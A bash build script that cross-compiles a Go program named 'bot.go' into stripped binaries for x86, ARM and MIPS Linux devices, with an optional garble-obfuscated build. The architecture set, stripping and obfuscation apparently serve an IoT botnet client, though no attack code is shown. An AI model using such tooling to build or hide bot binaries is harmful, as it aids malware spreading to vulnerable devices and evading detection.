#!/bin/bash
# Function for normal build
# Please dont think is this just junk this is efficent.
normal_build() {
    echo "Building normal binaries..."
    
    GOOS=linux GOARCH=386 go build -ldflags="-s -w" bot.go
    mv bot x86
    
    GOOS=linux GOARCH=arm GOARM=7 go build -ldflags="-s -w" bot.go
    mv bot armv7l
    
    GOOS=linux GOARCH=arm GOARM=5 go build -ldflags="-s -w" bot.go
    mv bot armv5l
    
    GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" bot.go
    mv bot armv8l
    
    GOOS=linux GOARCH=mips go build -ldflags="-s -w" bot.go
    mv bot mips
    
    GOOS=linux GOARCH=mipsle go build -ldflags="-s -w" bot.go
    mv bot mipsel
    
    echo "Normal build completed!"
}

# Function for obfuscated build
obfuscated_build() {
    echo "Building obfuscated binaries..."
    
    # Check if garble is installed
    if ! command -v garble &> /dev/null; then
        echo "Error: garble not found. Please install it first:"
        echo "go install mvdan.cc/garble@latest"
        exit 1
    fi
    
    # Obfuscated builds with garble
    GOOS=linux GOARCH=386 garble build -ldflags="-s -w" bot.go
    mv bot x86
    
    GOOS=linux GOARCH=arm GOARM=7 garble build -ldflags="-s -w" bot.go
    mv bot armv7l
    
    GOOS=linux GOARCH=arm GOARM=5 garble build -ldflags="-s -w" bot.go
    mv bot armv5l
    
    GOOS=linux GOARCH=arm64 garble build -ldflags="-s -w" bot.go
    mv bot armv8l
    
    GOOS=linux GOARCH=mips garble build -ldflags="-s -w" bot.go
    mv bot mips
    
    GOOS=linux GOARCH=mipsle garble build -ldflags="-s -w" bot.go
    mv bot mipsel
    
    echo "Obfuscated build completed!"
}

# Prompt user for build type
echo "Select build type:"
echo "1) Normal build"
echo "2) Obfuscated build (requires garble)"
read -p "Enter your choice (1-2): " choice

case $choice in
    1)
        normal_build
        ;;
    2)
        obfuscated_build
        ;;
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac
